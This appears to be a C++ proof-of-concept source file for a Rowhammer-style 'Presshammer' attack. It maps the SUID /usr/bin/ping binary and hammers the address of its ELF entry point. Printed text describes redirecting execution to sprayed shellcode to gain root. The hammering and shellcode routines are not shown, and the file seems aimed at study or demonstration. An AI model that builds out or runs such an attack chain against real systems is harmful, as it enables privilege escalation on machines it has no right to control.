#include "elf_header.h"


namespace color {
    constexpr const char* RESET  = "\033[0m";
    constexpr const char* RED    = "\033[31m";
    constexpr const char* GREEN  = "\033[32m";
    constexpr const char* YELLOW = "\033[33m";
    constexpr const char* BLUE   = "\033[34m";
}


int openBinary(){
    int fd = open("/usr/bin/ping", O_RDONLY);
    if(fd == -1){
        showErrorInfo("Error opening binary: /usr/bin/ping");
        perror("open");
        close(fd);
        exit(EXIT_FAILURE);
    }
    return fd;
}




void checkElfHeader(bool isDoubleSided) {
    showInfo("CHECK ELF HEADER (E_ENTRY)");
    
    // ========================================================================
    // STEP 1. Open binary with SUID bit active or sudo permissions
    // ========================================================================
    showStep(1, "Open binary with SUID bit active or sudo permissions");

    int fd = openBinary();
    off_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    showSuccessInfo("/usr/bin/ping binary opened");


    // ========================================================================
    // STEP 2. Map the binary into memory (read-only, private)
    // ========================================================================
    showStep(2, "Map the binary into memory (read-only, private)");

    auto *mappedTarget = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mappedTarget == MAP_FAILED) {
        showErrorInfo("mmap failed");
        perror("mmap");
        close(fd);
        exit(EXIT_FAILURE);
    }

    volatile char *binaryTargetAddress = (volatile char*) mappedTarget;
    uintptr_t binaryTarget = (uintptr_t) binaryTargetAddress;

    showSuccessAddress("/usr/bin/ping mapped: ", binaryTarget);


    // ========================================================================
    // STEP 3. Access the ELF header (this gives access to the value of e_entry)
    // ========================================================================
    showStep(3, "Access the ELF header (this gives access to the value of e_entry)"); 
    
    Elf64_Ehdr *header = (Elf64_Ehdr *) mappedTarget;
    showElfHeaderInfo(header);

    volatile char *targetAddress = (volatile char *) & (header->e_entry);
    uintptr_t target = (uintptr_t) targetAddress;



    // ======================================================================================================
    // STEP 4. Check if can apply presshammer (double or single sided) to try to modify the e_entry address
    // ======================================================================================================
    showStep(4, "Check if can apply presshammer to try to modify the e_entry address");

    if(isDoubleSided){
        doubleSidedPresshammer(target);
    }else{
        singleSidedPresshammer(target);
    }
    showSuccessAddress("Hammered target address: ", target);

    munmap(mappedTarget, size);
    close(fd);


    // ========================================================================
    // CONCLUSION
    // ========================================================================
    showConclusion();
    std::cout << "The goal is to modify the value of `e_entry` in memory. \n"
    << "- `e_entry` is the entry point of the program, i.e., the address where the OS starts executing the binary. \n"
    << "- If we manage to modify this address, we can redirect the execution of the binary to a location in memory controlled by the attacker (e.g., where malicious shellcode resides). \n"
    << "In this case, we use the **Presshammer** technique, a hardware attack that induces bit errors in memory cells by repeatedly accessing neighboring memory addresses. \n"
    << "This will allow us to try and modify the `e_entry` address. \n" << std::endl;

    std::cout << "**Spray of shellcode:** \n" 
    << "A \"spray\" of memory must be created around the address we altered, filling that area with malicious shellcode. \n"
    << "The shellcode should be designed to execute arbitrary commands (e.g., spawning a shell). \n"
    << "If the modification of `e_entry` is successful, the OS may execute the shellcode instead of the original binary code. \n" << std::endl;
 
    std::cout << "**Impact of a successful attack:** \n" 
    << "If the attack is successful, the binary that originally had normal user permissions (e.g., executed by a non-privileged user) \n"
    << "will now execute with **root** privileges because the SUID bit in the **ping** binary grants those privileges to the process. \n"
    << "If `e_entry` points to malicious shellcode, the attacker could execute commands with root privileges, resulting in a **privilege escalation**. \n" << std::endl;

    std::cout << "**Limitations of the attack:** \n"
    << "This attack only affects the process's memory. The modifications in memory are volatile and only exist while the process is running." << std::endl;

}